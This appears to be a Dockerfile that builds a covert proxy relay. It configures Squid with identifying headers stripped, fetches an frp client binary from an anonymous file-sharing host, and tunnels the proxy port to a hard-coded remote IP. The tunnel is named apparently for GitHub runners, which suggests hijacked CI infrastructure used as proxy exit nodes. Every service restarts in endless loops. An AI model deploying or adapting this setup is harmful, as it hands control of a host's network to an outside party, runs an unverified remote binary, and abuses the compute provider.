FROM --platform=linux/amd64 alpine:3.19
RUN apk add --no-cache squid apache2-utils wget curl bash

RUN echo 'http_port 3128' > /etc/squid/squid.conf && \
    echo 'auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwd' >> /etc/squid/squid.conf && \
    echo 'auth_param basic realm proxy' >> /etc/squid/squid.conf && \
    echo 'auth_param basic credentialsttl 2 hours' >> /etc/squid/squid.conf && \
    echo 'acl authenticated proxy_auth REQUIRED' >> /etc/squid/squid.conf && \
    echo 'http_access allow authenticated' >> /etc/squid/squid.conf && \
    echo 'http_access deny all' >> /etc/squid/squid.conf && \
    echo 'forwarded_for off' >> /etc/squid/squid.conf && \
    echo 'via off' >> /etc/squid/squid.conf && \
    echo 'cache_mem 16 MB' >> /etc/squid/squid.conf && \
    echo 'maximum_object_size_in_memory 512 KB' >> /etc/squid/squid.conf && \
    echo 'cache deny all' >> /etc/squid/squid.conf && \
    echo 'client_persistent_connections off' >> /etc/squid/squid.conf && \
    echo 'server_persistent_connections off' >> /etc/squid/squid.conf && \
    echo 'half_closed_clients off' >> /etc/squid/squid.conf && \
    echo 'client_lifetime 30 minutes' >> /etc/squid/squid.conf && \
    echo 'connect_timeout 10 seconds' >> /etc/squid/squid.conf && \
    echo 'read_timeout 30 seconds' >> /etc/squid/squid.conf && \
    echo 'request_timeout 30 seconds' >> /etc/squid/squid.conf && \
    echo 'persistent_request_timeout 15 seconds' >> /etc/squid/squid.conf && \
    echo 'visible_hostname localhost' >> /etc/squid/squid.conf

RUN wget "https://files.catbox.moe/za4auo.gz" && \
    gunzip za4auo.gz && \
    tar -xf za4auo && \
    mv frp_0.61.2_linux_amd64/frpc /usr/local/bin/frpc && \
    rm -rf frp_0.61.2_linux_amd64 za4auo

RUN echo '#!/bin/bash' > /start.sh && \
    echo 'htpasswd -cb /etc/squid/passwd "$PROXY_USER" "$PROXY_PASS"' >> /start.sh && \
    echo 'cat > frpc.toml <<FRP' >> /start.sh && \
    echo 'serverAddr = "45.144.53.63"' >> /start.sh && \
    echo 'serverPort = 7000' >> /start.sh && \
    echo 'auth.method = "token"' >> /start.sh && \
    echo "auth.token = \"\$TOKEN\"" >> /start.sh && \
    echo '[[proxies]]' >> /start.sh && \
    echo 'name = "github-squid-6014-r1"' >> /start.sh && \
    echo 'type = "tcp"' >> /start.sh && \
    echo 'localIP = "127.0.0.1"' >> /start.sh && \
    echo 'localPort = 3128' >> /start.sh && \
    echo 'remotePort = 6014' >> /start.sh && \
    echo 'FRP' >> /start.sh && \
    echo '' >> /start.sh && \
    echo '(while true; do' >> /start.sh && \
    echo '  echo "[squid] starting..."' >> /start.sh && \
    echo '  rm -f /var/run/squid.pid' >> /start.sh && \
    echo '  squid -N -f /etc/squid/squid.conf' >> /start.sh && \
    echo '  echo "[squid] exited with code $?, restarting in 3s"' >> /start.sh && \
    echo '  sleep 3' >> /start.sh && \
    echo 'done) &' >> /start.sh && \
    echo '' >> /start.sh && \
    echo 'sleep 2' >> /start.sh && \
    echo '' >> /start.sh && \
    echo '(while true; do' >> /start.sh && \
    echo '  echo "[frpc] starting..."' >> /start.sh && \
    echo '  frpc -c frpc.toml' >> /start.sh && \
    echo '  echo "[frpc] exited with code $?, restarting in 3s"' >> /start.sh && \
    echo '  sleep 3' >> /start.sh && \
    echo 'done) &' >> /start.sh && \
    echo '' >> /start.sh && \
    echo 'while true; do' >> /start.sh && \
    echo '  free -m' >> /start.sh && \
    echo '  sleep 30' >> /start.sh && \
    echo 'done' >> /start.sh && \
    chmod +x /start.sh

CMD ["/bin/bash", "/start.sh"]




















































































































































































